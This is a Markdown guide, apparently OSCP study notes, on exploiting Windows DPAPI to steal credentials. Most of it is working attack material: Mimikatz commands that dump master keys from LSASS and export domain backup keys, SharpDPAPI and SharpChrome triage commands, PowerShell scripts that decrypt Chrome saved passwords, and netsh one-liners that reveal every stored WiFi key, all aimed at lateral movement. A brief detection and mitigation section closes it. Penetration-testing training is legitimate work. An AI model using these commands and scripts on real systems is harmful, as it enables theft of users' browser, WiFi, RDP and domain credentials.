# DPAPI Exploitation Guide

Complete guide for exploiting Windows Data Protection API (DPAPI) to extract credentials from browsers, WiFi, RDP, and other sources.

---

## Table of Contents
1. [DPAPI Overview](#1-dpapi-overview)
2. [Master Key Extraction](#2-master-key-extraction)
3. [Browser Credential Theft](#3-browser-credential-theft)
4. [WiFi Password Extraction](#4-wifi-password-extraction)
5. [RDP Credential Manager](#5-rdp-credential-manager)
6. [Domain DPAPI Backups](#6-domain-dpapi-backups)
7. [SharpDPAPI Usage](#7-sharpdpapi-usage)
8. [Mimikatz DPAPI Module](#8-mimikatz-dpapi-module)
9. [OSCP Practical Examples](#9-oscp-practical-examples)

---

## 1. DPAPI Overview

### 1.1 What is DPAPI?

**Data Protection API (DPAPI):**
- Windows feature for encrypting user data
- Protects credentials, certificates, WiFi passwords
- Uses master keys derived from user password

**Protected Data:**
- Browser passwords (Chrome, Edge, Firefox)
- WiFi credentials
- RDP Credential Manager
- EFS certificates
- Outlook credentials
- VPN passwords

---

### 1.2 How DPAPI Works

**Flow:**
```
User Password → Master Key → Data Encryption Key → Encrypted Data
```

**Storage Locations:**
```
Master Keys:     C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\
DPAPI Blobs:     Application-specific (Chrome, WiFi, etc.)
Domain Backups:  Active Directory (LDAP)
```

---

### 1.3 Attack Surface

**Scenario 1: Local Admin**
- Extract master key from LSASS
- Decrypt DPAPI blobs

**Scenario 2: User Context**
- Master key already available in memory
- Decrypt blobs with current credentials

**Scenario 3: Domain Compromise**
- Extract DPAPI backup keys from DC
- Decrypt any user's DPAPI data

---

## 2. Master Key Extraction

### 2.1 Locate Master Keys

**Path:**
```cmd
dir /a C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>\
```

**Example:**
```
C:\Users\alice\AppData\Roaming\Microsoft\Protect\S-1-5-21-...\
├── CREDHIST
├── Preferred  (pointer to current master key)
├── 9f2c8d4a-...  (Master Key 1)
└── a3b5e7c1-...  (Master Key 2)
```

---

### 2.2 Extract with Mimikatz

**Dump Master Keys (LSASS):**
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::dpapi
```

**Output:**
```
Authentication Id : 0 ; 123456
User              : DOMAIN\alice
MasterKey         : 9f2c8d4a1b3e5f7c...
  GUID            : {9f2c8d4a-1b3e-5f7c-...}
  Time            : 2024-01-05 10:00:00
  SHA1            : a3b5e7c1d9f2a4b6...
```

---

### 2.3 Decrypt Master Key from File

**Using User Password:**
```cmd
mimikatz # dpapi::masterkey /in:C:\Users\alice\AppData\Roaming\Microsoft\Protect\S-1-5-21...\9f2c8d4a... /password:Password123!
```

**Using Domain Backup Key:**
```cmd
mimikatz # dpapi::masterkey /in:C:\Users\alice\AppData\Roaming\Microsoft\Protect\S-1-5-21...\9f2c8d4a... /pvk:domain_backup.pvk
```

---

## 3. Browser Credential Theft

### 3.1 Chrome Passwords

**Location:**
```
Login Data: C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data
```

**Database:**
- SQLite database
- Passwords encrypted with DPAPI
- Key: `origin_url`, `username_value`, `password_value`

**Extract with SharpChrome:**
```powershell
# Download SharpChrome
.\SharpChrome.exe logins

# Output
[*] Decrypting Login Data for user alice
[+] https://gmail.com
    Username: alice@gmail.com
    Password: SuperSecret123!
```

---

### 3.2 Edge Passwords

**Location:**
```
Login Data: C:\Users\<user>\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
```

**Extract:**
```powershell
.\SharpChrome.exe logins /browser:edge
```

---

### 3.3 Manual Chrome Extraction

**PowerShell Script:**
```powershell
# Load database
$db = "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data"
Copy-Item $db -Destination "$env:TEMP\LoginData.db"

# Query (requires DPAPI decryption)
Add-Type -AssemblyName System.Data
$conn = New-Object System.Data.SQLite.SQLiteConnection
$conn.ConnectionString = "Data Source=$env:TEMP\LoginData.db"
$conn.Open()

$cmd = $conn.CreateCommand()
$cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
$reader = $cmd.ExecuteReader()

while ($reader.Read()) {
    $url = $reader["origin_url"]
    $user = $reader["username_value"]
    $encPass = $reader["password_value"]

    # Decrypt with DPAPI
    $pass = [System.Security.Cryptography.ProtectedData]::Unprotect(
        $encPass, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    )

    Write-Host "$url - $user : $([System.Text.Encoding]::UTF8.GetString($pass))"
}
```

---

## 4. WiFi Password Extraction

### 4.1 WiFi Credential Storage

**Location:**
```
C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\<GUID>\*.xml
```

**Example XML:**
```xml
<WLANProfile>
  <name>CorporateWiFi</name>
  <keyMaterial>01000000D08C9DDF0115D1118C7A00C04FC297EB01...</keyMaterial>
</WLANProfile>
```

**keyMaterial:** DPAPI-encrypted password

---

### 4.2 Extract with netsh

**Simple Method:**
```cmd
netsh wlan show profiles
netsh wlan show profile "CorporateWiFi" key=clear
```

**Output:**
```
Key Content : Password123!
```

---

### 4.3 Extract with SharpDPAPI

**All WiFi Passwords:**
```powershell
.\SharpDPAPI.exe wifi

# Output
[*] Decrypting WiFi profiles for user alice
[+] SSID: CorporateWiFi
    Password: Password123!
[+] SSID: HomeNetwork
    Password: MyWiFiPass!
```

---

## 5. RDP Credential Manager

### 5.1 Credential Storage

**Windows Credential Manager:**
```
C:\Users\<user>\AppData\Local\Microsoft\Credentials\*
C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\*
```

**Types:**
- Generic Credentials (RDP, SMB)
- Domain Credentials
- Certificate-based credentials

---

### 5.2 Extract with Mimikatz

**Dump Credentials:**
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::dpapi

# Then decrypt vaults
mimikatz # vault::list
mimikatz # vault::cred /patch
```

**Output:**
```
Credential Manager
  Type         : Generic
  Target       : TERMSRV/server01.corp.local
  User         : CORP\alice
  Password     : AdminPass123!
```

---

### 5.3 Extract with SharpDPAPI

```powershell
.\SharpDPAPI.exe credentials

# Output
[*] Decrypting Credential Manager for user alice
[+] Target: TERMSRV/server01.corp.local
    User:   CORP\alice
    Pass:   AdminPass123!
```

---

## 6. Domain DPAPI Backups

### 6.1 Domain Backup Key

**Concept:**
- Domain controllers maintain DPAPI backup keys
- Allows domain admins to recover user data
- Stored in Active Directory

**Attack:**
1. Compromise Domain Controller
2. Extract DPAPI backup key
3. Decrypt any domain user's DPAPI data

---

### 6.2 Extract Backup Key (Mimikatz)

**From Domain Controller:**
```cmd
mimikatz # privilege::debug
mimikatz # lsadump::backupkeys /system:dc01.corp.local /export

# Output
Current preferred key: {a3b5e7c1-...}
  * RSA key
    Exporting to: ntds_legacy_a3b5e7c1.pvk
    Exporting to: ntds_legacy_a3b5e7c1.key
```

**Files:**
- `.pvk`: Private key (binary)
- `.key`: Private key (text)

---

### 6.3 Use Backup Key to Decrypt

**Decrypt User Master Key:**
```cmd
mimikatz # dpapi::masterkey /in:C:\Users\alice\AppData\Roaming\Microsoft\Protect\...\9f2c8d4a... /pvk:ntds_legacy_a3b5e7c1.pvk
```

**Decrypt Chrome Passwords:**
```powershell
.\SharpDPAPI.exe triage /pvk:ntds_legacy_a3b5e7c1.pvk /target:C:\Users\alice
```

---

## 7. SharpDPAPI Usage

### 7.1 Installation

**Compile:**
```powershell
# Download from GitHub
git clone https://github.com/GhostPack/SharpDPAPI.git
cd SharpDPAPI

# Compile with Visual Studio or:
csc.exe /target:exe /out:SharpDPAPI.exe *.cs
```

---

### 7.2 Common Commands

**Triage (All Credentials):**
```powershell
# Current user
.\SharpDPAPI.exe triage

# Specific user
.\SharpDPAPI.exe triage /target:C:\Users\alice

# With PVK (domain backup key)
.\SharpDPAPI.exe triage /pvk:ntds_legacy.pvk
```

**Chrome Passwords:**
```powershell
.\SharpDPAPI.exe logins
```

**WiFi Passwords:**
```powershell
.\SharpDPAPI.exe wifi
```

**Credential Manager:**
```powershell
.\SharpDPAPI.exe credentials
```

**Vaults:**
```powershell
.\SharpDPAPI.exe vaults
```

---

### 7.3 Advanced Usage

**Search Specific Files:**
```powershell
.\SharpDPAPI.exe blob /target:C:\Path\To\EncryptedFile.blob /mkfile:C:\Path\To\MasterKey
```

**Machine DPAPI:**
```powershell
.\SharpDPAPI.exe machinecredentials
.\SharpDPAPI.exe machinevaults
```

---

## 8. Mimikatz DPAPI Module

### 8.1 Basic Commands

**Dump Master Keys (from LSASS):**
```cmd
mimikatz # sekurlsa::dpapi
```

**Decrypt Master Key File:**
```cmd
mimikatz # dpapi::masterkey /in:path\to\masterkey /password:Password123!
```

**Decrypt DPAPI Blob:**
```cmd
mimikatz # dpapi::blob /in:path\to\blob.bin /masterkey:9f2c8d4a...
```

---

### 8.2 Chrome Decryption

**Extract Login Data:**
```cmd
# Copy database
copy "C:\Users\alice\AppData\Local\Google\Chrome\User Data\Default\Login Data" login.db

# Decrypt with Mimikatz
mimikatz # dpapi::chrome /in:login.db
```

---

### 8.3 WiFi Decryption

**Decrypt WiFi Profile:**
```cmd
mimikatz # dpapi::wifi
```

---

## 9. OSCP Practical Examples

### 9.1 Scenario: Compromised Workstation

**Goal:** Extract all credentials

**Steps:**
```powershell
# 1. Upload SharpDPAPI
upload SharpDPAPI.exe C:\Windows\Temp\s.exe

# 2. Extract all credentials
.\s.exe triage

# 3. Collect results
# - Browser passwords
# - WiFi keys
# - RDP credentials
# - Generic credentials
```

---

### 9.2 Scenario: Domain Admin Access

**Goal:** Extract DPAPI backup key and decrypt all users

**Steps:**
```cmd
# 1. On Domain Controller
mimikatz # privilege::debug
mimikatz # lsadump::backupkeys /system:dc01.corp.local /export

# 2. Transfer ntds_legacy.pvk to workstation

# 3. Decrypt target user data
.\SharpDPAPI.exe triage /target:C:\Users\bob /pvk:ntds_legacy.pvk
```

---

### 9.3 Quick Chrome Password Extraction

**PowerShell One-Liner:**
```powershell
# Copy database
$db = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$tmp = "$env:TEMP\LoginData"
Copy-Item $db $tmp -Force

# Query and decrypt
Add-Type -AssemblyName System.Security
$conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp")
$conn.Open()
$cmd = $conn.CreateCommand()
$cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
$reader = $cmd.ExecuteReader()
while ($reader.Read()) {
    $url = $reader[0]
    $user = $reader[1]
    $enc = $reader[2]
    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($enc, $null, 'CurrentUser')
    Write-Host "$url | $user | $([Text.Encoding]::UTF8.GetString($dec))"
}
```

---

### 9.4 WiFi Password Quick Extraction

**CMD:**
```cmd
for /f "tokens=2 delims=:" %i in ('netsh wlan show profiles ^| findstr "All User Profile"') do @netsh wlan show profile %i key=clear | findstr "Key Content"
```

**PowerShell:**
```powershell
(netsh wlan show profiles) | Select-String ": " | ForEach-Object {
    $name = $_.ToString().Split(":")[1].Trim()
    (netsh wlan show profile name=$name key=clear) | Select-String "Key Content"
}
```

---

## 10. Detection & Prevention

### 10.1 Blue Team Detection

**Indicators:**
- Access to `\AppData\Roaming\Microsoft\Protect\`
- Chrome/Edge database access while browser running
- `vaultcmd.exe`, `mimikatz.exe`, `SharpDPAPI.exe`
- Unusual LSASS access (DPAPI master key extraction)

**Event IDs:**
- 4663: Access to sensitive files
- 4688: Process creation (SharpDPAPI, Mimikatz)

---

### 10.2 Mitigation

**Enterprise:**
- Windows Hello for Business (no password = no DPAPI)
- Hardware security modules (HSM)
- Credential Guard
- Protected Process Light (PPL) for LSASS

**User:**
- Strong passwords (harder to crack master key)
- Multi-factor authentication
- Use password managers instead of browser storage

---

## 11. Tools Summary

| Tool | Purpose | OSCP Relevant |
|------|---------|---------------|
| **SharpDPAPI** | All-in-one DPAPI extraction | ✅ Yes |
| **Mimikatz** | Master key & credential extraction | ✅ Yes |
| **SharpChrome** | Chrome password extraction | ⚠️ Useful |
| **LaZagne** | Multi-application password dump | ⚠️ Useful |
| **netsh** | Built-in WiFi password extraction | ✅ Yes |

---

## 12. Attack Workflow Summary

```
┌─────────────────────┐
│ Compromise Host     │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ Extract Master Keys │ ← sekurlsa::dpapi (Mimikatz)
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ Decrypt DPAPI Data  │ ← SharpDPAPI triage
│ - Chrome            │
│ - WiFi              │
│ - Credentials       │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ Lateral Movement    │ ← Use extracted credentials
└─────────────────────┘
```

---

## 13. References
- Microsoft DPAPI: https://docs.microsoft.com/en-us/windows/win32/api/dpapi/
- SharpDPAPI: https://github.com/GhostPack/SharpDPAPI
- Mimikatz DPAPI: https://github.com/gentilkiwi/mimikatz/wiki/module-~-dpapi
- ired.team: https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++

---

**OSCP Note:** Focus on SharpDPAPI and netsh for WiFi. Chrome password extraction is valuable for lateral movement. Domain DPAPI backup keys are powerful if you compromise DC!
